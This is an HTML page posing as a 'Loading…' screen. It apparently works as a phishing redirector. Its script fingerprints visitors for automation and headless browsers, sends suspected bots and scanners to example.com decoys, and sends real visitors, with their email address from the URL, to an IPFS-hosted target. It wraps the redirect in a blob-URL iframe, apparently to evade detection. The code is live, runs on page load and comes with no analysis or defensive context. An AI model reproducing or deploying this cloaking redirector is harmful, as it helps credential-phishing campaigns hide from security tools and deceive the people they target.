<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Loadingâ€¦</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<style>
html, body {
    margin: 0;
    padding: 0;
    width: 100%;
    height: 100%;
    background: #fff;
}
</style>
</head>

<body>

<script>
(function () {
    'use strict';

    const TARGET_BASE = "https://bafkreibczthledbepbupqr6h74nqvjm3jm4hnbtcbtdwhvz5y3kyk3nzii.ipfs.dweb.link/";
    const FAKE_URLS = [
        "https://example.com",
        "https://www.example.org",
        "https://www.example.net"
    ];

    // ===== ORIGINAL ANTIBOT (RESTORED) =====
    function detectBot() {
        let score = 0;

        const automationProps = [
            'webdriver', '__webdriver_evaluate', '__selenium_evaluate',
            '__fxdriver_evaluate', '__driver_evaluate',
            '__webdriver_script_function',
            '__webdriver_script_fn',
            '__lastWatirAlert',
            '__lastWatirConfirm'
        ];

        automationProps.forEach(prop => {
            if (prop === 'webdriver') {
                if (navigator.webdriver === true) score += 40;
            } else if (window[prop] !== undefined) {
                score += 30;
            }
        });

        try {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');

            if (!gl) {
                score += 30;
            } else {
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                if (debugInfo) {
                    const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                    if (
                        renderer.includes('SwiftShader') ||
                        renderer.includes('llvmpipe') ||
                        renderer.includes('Google SwiftShader')
                    ) {
                        score += 35;
                    }
                }
            }

            const ctx = canvas.getContext('2d');
            ctx.textBaseline = "top";
            ctx.font = "14px Arial";
            ctx.fillStyle = "#f60";
            ctx.fillRect(125, 1, 62, 20);
            ctx.fillStyle = "#069";
            ctx.fillText("test", 2, 15);

            const dataUrl = canvas.toDataURL();
            if (!dataUrl || dataUrl.length < 100) {
                score += 20;
            }

        } catch (e) {
            score += 25;
        }

        if (navigator.plugins.length === 0) score += 15;
        if (navigator.languages && navigator.languages.length === 0) score += 10;
        if (!window.chrome || !window.chrome.runtime) score += 10;
        if (!('ontouchstart' in window) && navigator.plugins.length === 0) score += 10;
        if (screen.width === 800 && screen.height === 600) score += 10;

        return score > 50;
    }

    function getEmail() {
        try {
            const params = new URLSearchParams(location.search);
            return params.get('email') || '';
        } catch {
            return '';
        }
    }

    function createBlob(targetUrl, email) {
        const html = `
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
html, body {
    margin: 0;
    padding: 0;
    width: 100%;
    height: 100%;
}
iframe {
    width: 100%;
    height: 100%;
    border: none;
}
</style>
</head>
<body>
<iframe src="${targetUrl}"></iframe>
<script>const email="${email}";<\/script>
</body>
</html>`;
        return new Blob([html], { type: "text/html" });
    }

    function run() {
        const isBot = detectBot();
        const email = getEmail();

        if (isBot) {
            location.replace(FAKE_URLS[Math.floor(Math.random() * FAKE_URLS.length)]);
            return;
        }

        const targetUrl = email
            ? TARGET_BASE + "?email=" + encodeURIComponent(email)
            : TARGET_BASE;

        try {
            const blobUrl = URL.createObjectURL(createBlob(targetUrl, email));
            location.replace(blobUrl);

            setTimeout(() => {
                try { URL.revokeObjectURL(blobUrl); } catch {}
            }, 10000);

        } catch {
            // Fallback if Blob is blocked
            location.replace(targetUrl);
        }
    }

    if (document.readyState === "loading") {
        document.addEventListener("DOMContentLoaded", run);
    } else {
        run();
    }

})();
</script>

</body>
</html>
